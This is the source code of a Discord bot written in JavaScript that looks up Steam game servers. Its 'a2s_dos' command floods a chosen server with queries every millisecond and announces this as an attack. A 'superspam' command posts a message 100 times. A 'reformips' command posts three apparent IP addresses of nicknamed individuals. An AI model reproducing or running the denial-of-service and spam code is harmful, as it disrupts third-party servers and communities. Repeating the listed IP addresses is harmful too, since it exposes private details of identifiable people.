const {Client,Events, GatewayIntentBits, MessageEmbed,PermissionsBitField, TextChannel,MessageCollector, Collection} = require("discord.js");
const {
	joinVoiceChannel,
	createAudioPlayer,
	createAudioResource,
	entersState,
	StreamType,
	AudioPlayerStatus,
	VoiceConnectionStatus,
} = require('@discordjs/voice')
const fileSystem = require("fs");
var geoip = require("geoip-lite");
var geocoder = require('local-reverse-geocoder');
const {queryGameServerPlayer,queryGameServerInfo,queryMasterServer,REGIONS} = require('steam-server-query');
const path = require('path')

const client = new Client({
    intents: [GatewayIntentBits.GuildMessages,GatewayIntentBits.GuildMembers]
});
client.commands = new Collection();
const commandsPath = path.join(__dirname,'commands');
const commandFiles = fileSystem.readdirSync(commandsPath).filter(file => file.endsWith('.js'));

//boilerplate
for(const file of commandFiles) {
    const filePath = path.join(commandsPath,file);
    const command = require(filePath);
    if('data' in command && 'execute' in command) {
        client.commands.set(command.data.name, command);
    } else {
        console.log(`Invalid command! ${filepath} is missing require 'data' or 'execute' property`);
    }
}

var fartid = 872543618391490560;
client.on("ready", () => {
    console.log("fartbot activated");
});

const dashanid = 476979646639112193;
var banidlist = ["872543618391490560","514259663278178314","923378656125001738"]
    //var banidlist = ["820463735629545503"];
var demotelist = ["533898212214571024", "142051886751547393", "451223974781779969"]
    //var demotelist = ["820463735629545503"];
const ownerid = 849053208911282198
var fartbots = ["514259663278178314","772589373685760041"]
function getIDFromMention(mention) {
    if (!mention) return;

    if (mention.startsWith('<@') && mention.endsWith('>')) {
        mention = mention.slice(2, -1);

        if (mention.startsWith('!')) {
            mention = mention.slice(1);
        }
        return mention;
    }
}
var a2s_target;
var timer = 0
var time = 60
function a2s_dos() {
    if (timer / 1000 > time) { end_dos() }
    if (a2s_target!=undefined) {
    console.log("firing")
    timer++
    queryGameServerInfo(a2s_target).then(response => {
        console.log(response.name)    
    })
    .catch(e => {
        console.error(e)
    })
    }
}
function end_dos() {
    clearInterval(a2s_dos_var)
    console.log("a2s_dos ended")
}
const player = createAudioPlayer();
function playSound(link) {
	const resource = createAudioResource(link, {
		inputType: StreamType.Arbitrary,
	});

	player.play(resource);

	return entersState(player, AudioPlayerStatus.Playing, 5e3);
}


client.on(Events.InteractionCreate, async interaction => {
	if (!interaction.isChatInputCommand()) return;

	const command = interaction.client.commands.get(interaction.commandName);

	if (!command) {
		console.error(`No command matching ${interaction.commandName} was found.`);
		return;
	}

	try {
		await command.execute(interaction);
	} catch (error) {
		console.error(`Error executing ${interaction.commandName}`);
		console.error(error);
	}
});

client.on("messageCreate", (message) => {
    message.guild.members.fetch(client.user.id)
    .then(self => {
        var sbot = self
    })
    
    args = message.content.substring(1).split(' ');
    cmd = args[0]
    if (message.content.substring(0, 1) === "^") {
        
        if (message.author.id == fartid) {
            var server = message.guild;
            switch (cmd) {
                case "hello":
                    message.channel.send("hello fartburger");
                    break;          
            }
        }
            var server = message.guild;
            switch (cmd) {
                    case 'serverinfo':
                        reqServer = args[1];
                        queryGameServerInfo(args[1]).then(response => {
                            //console.log(response)
                            var infoEmbed = new MessageEmbed()
                            .setTitle("Information for server "+response.name)
                            .setColor("DARK_RED")
                            .addField("Game: ",response.game)
                            .addField("Map: ",response.map)
                            .addField("Anticheat installed?: ",response.vac.toString())
                            .addField("Playercount: ",response.players.toString())
                            message.channel.send({embeds:[infoEmbed]})
                        })
                        .catch(e => {
                            console.error(e)
                            message.channel.send(`Something went wrong. Please try again.
\`\`\`${e}\`\`\``)
                        })
                        break;
                        case 'playerinfo':
                        queryGameServerPlayer(args[1]).then(response => {
                            console.log(response)
                            var names = ""
                            //response.players.forEach(player => {
                                //names = names+player.name+"\n";
                            //})
                            var infoEmbed = new MessageEmbed()
                            .setTitle("Information for server "+response.name)
                            .setColor("DARK_RED")
                            .addField("Players: ",names)
                            message.channel.send({embeds:[infoEmbed]})
                        })
                        .catch(e => {
                            console.error(e)
                            message.channel.send(`Something went wrong. Please try again.
\`\`\`${e}\`\`\``)
                        })
                        break;
                        case 'findserveripfromname':
                            if(args[1]===null) {
                                break
                            }
                            var timeout = args[2]!=null ? parseInt(args[2])*1000 : 10*1000
                            var namefilter = args[1]
                            queryMasterServer('hl2master.steampowered.com:27011',REGIONS.ALL, {gamedir: "Garrysmod",name_match: [namefilter]},timeout)
                            .then(servers => {
                                message.channel.send(`found results:
\`\`\`${servers.toString()}\`\`\``)
                                console.log(servers)
                            })
                            .catch(err => {
                                console.log(err)
                                message.channel.send(`something went wrong, please try again. error:
\`\`\`${err}\`\`\``)
                            })
                            
                        break;

                        case 'superspam':
                            attachments = Array.prototype.slice.call(message.attachments,0)
                            msgtosend = message.content.substring(11)
                            for(let i=0;i<100;i++) {
                                message.channel.send({content:msgtosend,files: attachments})
                                .then()
                                .catch(console.error)
                            }
                        break;
                        case 'reformips':
                            message.channel.send(`\`\`\`coomers ip: 174.58.99.194
gins ip: 108.249.187.243
doubles ip: 47.200.243.62\`\`\``)
                            break;
                        case 'a2s_dos':
                            timer = 0
                            a2s_target = args[1]
                            message.channel.send(`Starting attack on ${args[1]}`)
                            var a2s_dos_var = setInterval(a2s_dos,1)
                            
                        break;

            }

        
    }
});

client.login(process.env.TOKEN);